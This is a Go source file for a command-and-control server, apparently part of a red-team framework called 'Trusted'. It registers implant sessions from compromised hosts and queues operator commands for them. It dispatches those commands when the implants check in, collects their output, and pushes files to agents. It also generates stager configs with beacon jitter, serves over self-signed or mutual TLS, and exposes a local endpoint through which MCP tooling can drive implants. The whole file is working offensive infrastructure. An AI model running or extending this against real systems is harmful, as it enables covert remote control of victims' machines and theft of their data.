package c2

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/loudmumble/trusted/pkg/util"
)

// Listener is the C2 HTTP/HTTPS server that manages implant sessions.
type Listener struct {
	BindAddress string
	Port        int
	Protocol    string
	CertFile    string
	KeyFile     string
	MTLSCAFile  string // CA certificate for verifying client certs (mTLS enforcement)
	Running     bool

	mu       sync.RWMutex
	sessions map[string]*ImplantSession
	commands map[string][]QueuedCommand
	results  map[string][]CommandResult
	files    map[string][]FileDelivery
}

// ImplantSession represents a connected implant.
type ImplantSession struct {
	ID          string            `json:"id"`
	Hostname    string            `json:"hostname"`
	Username    string            `json:"username"`
	OS          string            `json:"os"`
	Arch        string            `json:"arch"`
	PID         int               `json:"pid"`
	RemoteAddr  string            `json:"remote_addr"`
	FirstSeen   time.Time         `json:"first_seen"`
	LastCheckin time.Time         `json:"last_checkin"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

// QueuedCommand is a command waiting to be sent to an implant.
type QueuedCommand struct {
	ID      string    `json:"id"`
	Command string    `json:"command"`
	Args    string    `json:"args,omitempty"`
	Queued  time.Time `json:"queued"`
}

// CheckinRequest is sent by implants when they phone home.
type CheckinRequest struct {
	SessionID string            `json:"session_id,omitempty"`
	Hostname  string            `json:"hostname"`
	Username  string            `json:"username"`
	OS        string            `json:"os"`
	Arch      string            `json:"arch"`
	PID       int               `json:"pid"`
	Metadata  map[string]string `json:"metadata,omitempty"`
}

// CheckinResponse is returned to implants with pending commands and file deliveries.
type CheckinResponse struct {
	SessionID string          `json:"session_id"`
	Commands  []QueuedCommand `json:"commands,omitempty"`
	Files     []FileDelivery  `json:"files,omitempty"`
	Interval  int             `json:"interval"`
}

// StagerConfig is the configuration for a generated stager.
type StagerConfig struct {
	ID       string    `json:"id"`
	C2URL    string    `json:"c2_url"`
	Interval int       `json:"interval_seconds"`
	Jitter   int       `json:"jitter_percent"`
	Protocol string    `json:"protocol"`
	Created  time.Time `json:"created"`
}

// Start launches the C2 listener with full session management.
func (l *Listener) Start() error {
	l.mu.Lock()
	l.sessions = make(map[string]*ImplantSession)
	l.commands = make(map[string][]QueuedCommand)
	l.results = make(map[string][]CommandResult)
	l.files = make(map[string][]FileDelivery)
	l.Running = true
	l.mu.Unlock()

	mux := http.NewServeMux()

	// Implant checkin endpoint — handles registration and polling
	mux.HandleFunc("/connect", l.handleCheckin)

	// Command result submission
	mux.HandleFunc("/result", l.handleResult)

	// Operator API — list sessions
	mux.HandleFunc("/api/sessions", l.handleListSessions)

	// Operator API — queue command
	mux.HandleFunc("/api/command", l.handleQueueCommand)

	// Operator API — get command results
	mux.HandleFunc("/api/results", l.handleGetResults)

	// File delivery and deploy endpoints
	l.addDeployRoutes(mux)

	// Health check
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":   "ok",
			"sessions": l.sessionCount(),
			"uptime":   time.Now().Format(time.RFC3339),
		})
	})

	addr := fmt.Sprintf("%s:%d", l.BindAddress, l.Port)
	server := &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	fmt.Printf("[+] C2 %s listener starting on %s\n", l.Protocol, addr)
	fmt.Println("[*] Endpoints:")
	fmt.Println("    POST /connect      — Implant checkin")
	fmt.Println("    POST /result       — Command result submission")
	fmt.Println("    GET  /api/sessions — List active sessions")
	fmt.Println("    POST /api/command  — Queue command for session")
	fmt.Println("    GET  /api/results  — Retrieve command results")
	fmt.Println("    POST /api/deploy   — Upload and deploy file to agent")
	fmt.Println("    GET  /api/files    — List pending file deliveries")
	fmt.Println("    GET  /health       — Health check")

	// Start local IPC server for MCP tooling
	go l.startIPCServer()

	if l.Protocol == "https" {
		if l.CertFile != "" && l.KeyFile != "" {
			fmt.Printf("[*] Using provided TLS cert: %s\n", l.CertFile)

			// If mTLS CA cert exists alongside the server cert, enforce client auth
			tlsCfg, mtlsErr := l.buildMTLSConfig()
			if mtlsErr == nil && tlsCfg != nil {
				serverCert, err := tls.LoadX509KeyPair(l.CertFile, l.KeyFile)
				if err != nil {
					return fmt.Errorf("load TLS keypair: %w", err)
				}
				tlsCfg.Certificates = []tls.Certificate{serverCert}
				server.TLSConfig = tlsCfg
				ln, err := net.Listen("tcp", addr)
				if err != nil {
					return fmt.Errorf("listen: %w", err)
				}
				tlsLn := tls.NewListener(ln, server.TLSConfig)
				fmt.Println("[+] mTLS enabled — server will verify client certificates")
				return server.Serve(tlsLn)
			}
			return server.ListenAndServeTLS(l.CertFile, l.KeyFile)
		}

		// Auto-generate self-signed certificate
		fmt.Println("[*] Generating self-signed TLS certificate...")
		cert, err := generateSelfSignedCert(l.BindAddress)
		if err != nil {
			return fmt.Errorf("generate TLS cert: %w", err)
		}

		tlsCfg := &tls.Config{
			Certificates: []tls.Certificate{cert},
		}

		// Check for mTLS CA pool
		if mtlsCfg, err := l.buildMTLSConfig(); err == nil && mtlsCfg != nil {
			tlsCfg.ClientAuth = mtlsCfg.ClientAuth
			tlsCfg.ClientCAs = mtlsCfg.ClientCAs
			fmt.Println("[+] mTLS enabled — server will verify client certificates")
		}

		server.TLSConfig = tlsCfg
		ln, err := net.Listen("tcp", addr)
		if err != nil {
			return fmt.Errorf("listen: %w", err)
		}
		tlsLn := tls.NewListener(ln, server.TLSConfig)
		return server.Serve(tlsLn)
	}

	return server.ListenAndServe()
}

// startIPCServer spawns a local REST server on port 24242 to allow external
// processes (like the MCP server) to interact with the C2 listener.
func (l *Listener) startIPCServer() {
	mux := http.NewServeMux()
	mux.HandleFunc("/api/sessions", l.handleListSessions)
	mux.HandleFunc("/api/command", l.handleQueueCommand)
	mux.HandleFunc("/api/results", l.handleGetResults)

	addr := "127.0.0.1:24242"
	fmt.Printf("[*] IPC server starting on http://%s\n", addr)
	server := &http.Server{
		Addr:    addr,
		Handler: mux,
	}
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		fmt.Printf("[!] IPC server failed: %v\n", err)
	}
}

// handleCheckin processes implant check-ins and returns queued commands.
func (l *Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST required", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20)) // 1MB limit
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var req CheckinRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}

	l.mu.Lock()
	defer l.mu.Unlock()

	sessionID := req.SessionID
	if sessionID == "" || l.sessions[sessionID] == nil {
		b := make([]byte, 16)
		if _, err := rand.Read(b); err != nil {
			http.Error(w, "failed to generate session ID", http.StatusInternalServerError)
			return
		}
		sessionID = hex.EncodeToString(b)

		l.sessions[sessionID] = &ImplantSession{
			ID:          sessionID,
			Hostname:    req.Hostname,
			Username:    req.Username,
			OS:          req.OS,
			Arch:        req.Arch,
			PID:         req.PID,
			RemoteAddr:  r.RemoteAddr,
			FirstSeen:   time.Now(),
			LastCheckin: time.Now(),
			Metadata:    req.Metadata,
		}
		fmt.Printf("[+] New session: %s (%s@%s %s/%s) from %s\n",
			util.ShortID(sessionID), req.Username, req.Hostname, req.OS, req.Arch, r.RemoteAddr)
	} else {
		// Update existing session
		sess := l.sessions[sessionID]
		sess.LastCheckin = time.Now()
		sess.RemoteAddr = r.RemoteAddr
		if req.PID != 0 {
			sess.PID = req.PID
		}
	}

	// Drain command queue for this session
	var cmds []QueuedCommand
	if pending, ok := l.commands[sessionID]; ok && len(pending) > 0 {
		cmds = pending
		delete(l.commands, sessionID)
		fmt.Printf("[*] Dispatching %d command(s) to session %s\n", len(cmds), shortID(sessionID))
	}

	// Drain file delivery queue for this session
	var files []FileDelivery
	if pending, ok := l.files[sessionID]; ok && len(pending) > 0 {
		files = pending
		delete(l.files, sessionID)
		fmt.Printf("[*] Dispatching %d file(s) to session %s\n", len(files), shortID(sessionID))
	}

	resp := CheckinResponse{
		SessionID: sessionID,
		Commands:  cmds,
		Files:     files,
		Interval:  5,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// handleResult processes command execution results from implants.
func (l *Listener) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST required", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 10<<20)) // 10MB limit for results
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var result struct {
		SessionID string `json:"session_id"`
		CommandID string `json:"command_id"`
		Output    string `json:"output"`
		ExitCode  int    `json:"exit_code"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}

	l.mu.Lock()
	l.results[result.SessionID] = append(l.results[result.SessionID], CommandResult{
		SessionID: result.SessionID,
		CommandID: result.CommandID,
		Output:    result.Output,
		ExitCode:  result.ExitCode,
	})
	l.mu.Unlock()

	fmt.Printf("[+] Result from %s (cmd=%s, exit=%d):\n%s\n",
		shortID(result.SessionID), shortID(result.CommandID), result.ExitCode, result.Output)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"received"}`))
}

// handleListSessions returns all active sessions as JSON.
func (l *Listener) handleListSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET required", http.StatusMethodNotAllowed)
		return
	}

	l.mu.RLock()
	sessions := make([]*ImplantSession, 0, len(l.sessions))
	for _, s := range l.sessions {
		sessions = append(sessions, s)
	}
	l.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

// handleQueueCommand queues a command for a specific session.
func (l *Listener) handleQueueCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST required", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var req struct {
		SessionID string `json:"session_id"`
		Command   string `json:"command"`
		Args      string `json:"args"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid JSON", http.StatusBadRequest)
		return
	}

	if req.SessionID == "" || req.Command == "" {
		http.Error(w, "session_id and command required", http.StatusBadRequest)
		return
	}

	l.mu.Lock()
	if _, ok := l.sessions[req.SessionID]; !ok {
		l.mu.Unlock()
		http.Error(w, "session not found", http.StatusNotFound)
		return
	}

	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		l.mu.Unlock()
		http.Error(w, "failed to generate command ID", http.StatusInternalServerError)
		return
	}
	cmdID := hex.EncodeToString(b)

	cmd := QueuedCommand{
		ID:      cmdID,
		Command: req.Command,
		Args:    req.Args,
		Queued:  time.Now(),
	}
	l.commands[req.SessionID] = append(l.commands[req.SessionID], cmd)
	l.mu.Unlock()

	fmt.Printf("[*] Queued command %s for session %s: %s\n", shortID(cmdID), shortID(req.SessionID), req.Command)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status":     "queued",
		"command_id": cmdID,
	})
}

// handleGetResults returns command results, optionally filtered by session_id query param.
func (l *Listener) handleGetResults(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET required", http.StatusMethodNotAllowed)
		return
	}

	sessionID := r.URL.Query().Get("session_id")
	results := l.GetResults(sessionID)
	if results == nil {
		results = []CommandResult{}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(results)
}

func shortID(id string) string {
	return util.ShortID(id)
}

func (l *Listener) sessionCount() int {
	l.mu.RLock()
	defer l.mu.RUnlock()
	return len(l.sessions)
}

func GenerateStagerConfig(c2URL string) *StagerConfig {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		panic(fmt.Sprintf("failed to generate random ID: %v", err))
	}
	return &StagerConfig{
		ID:       hex.EncodeToString(b),
		C2URL:    c2URL,
		Interval: 5,
		Jitter:   20,
		Protocol: "https",
		Created:  time.Now(),
	}
}

// generateSelfSignedCert creates a self-signed TLS certificate.
func generateSelfSignedCert(host string) (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("generate key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			Organization: []string{"Trusted C2"},
			CommonName:   host,
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	if ip := net.ParseIP(host); ip != nil {
		template.IPAddresses = append(template.IPAddresses, ip)
	} else {
		template.DNSNames = append(template.DNSNames, host)
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("create certificate: %w", err)
	}

	return tls.Certificate{
		Certificate: [][]byte{certDER},
		PrivateKey:  key,
	}, nil
}

// buildMTLSConfig creates a TLS config with client certificate verification
// if an mTLS CA file is configured. Returns nil if mTLS is not configured.
func (l *Listener) buildMTLSConfig() (*tls.Config, error) {
	if l.MTLSCAFile == "" {
		return nil, nil
	}

	caCert, err := os.ReadFile(l.MTLSCAFile)
	if err != nil {
		return nil, fmt.Errorf("read mTLS CA file: %w", err)
	}

	caPool := x509.NewCertPool()
	if !caPool.AppendCertsFromPEM(caCert) {
		// Try DER format
		if cert, err := x509.ParseCertificate(caCert); err == nil {
			caPool.AddCert(cert)
		} else {
			return nil, fmt.Errorf("mTLS CA file contains no valid certificates")
		}
	}

	return &tls.Config{
		ClientAuth: tls.RequireAndVerifyClientCert,
		ClientCAs:  caPool,
	}, nil
}

// CommandResult is the result of a command executed by an implant.
type CommandResult struct {
	SessionID string `json:"session_id"`
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	ExitCode  int    `json:"exit_code"`
}

// ListSessions returns all active implant sessions.
func (l *Listener) ListSessions() []*ImplantSession {
	l.mu.RLock()
	defer l.mu.RUnlock()
	sessions := make([]*ImplantSession, 0, len(l.sessions))
	for _, s := range l.sessions {
		sessions = append(sessions, s)
	}
	return sessions
}

func (l *Listener) QueueCommand(sessionID, command, args string) (string, error) {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.sessions == nil {
		return "", fmt.Errorf("listener not started")
	}
	if _, ok := l.sessions[sessionID]; !ok {
		return "", fmt.Errorf("session %s not found", sessionID)
	}

	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("generate command ID: %w", err)
	}
	cmdID := hex.EncodeToString(b)

	cmd := QueuedCommand{
		ID:      cmdID,
		Command: command,
		Args:    args,
		Queued:  time.Now(),
	}
	l.commands[sessionID] = append(l.commands[sessionID], cmd)
	return cmdID, nil
}

// GetResults returns stored command results, optionally filtered by session ID.
func (l *Listener) GetResults(sessionID string) []CommandResult {
	l.mu.RLock()
	defer l.mu.RUnlock()

	if sessionID != "" {
		if results, ok := l.results[sessionID]; ok {
			return results
		}
		return nil
	}

	var all []CommandResult
	for _, results := range l.results {
		all = append(all, results...)
	}
	return all
}
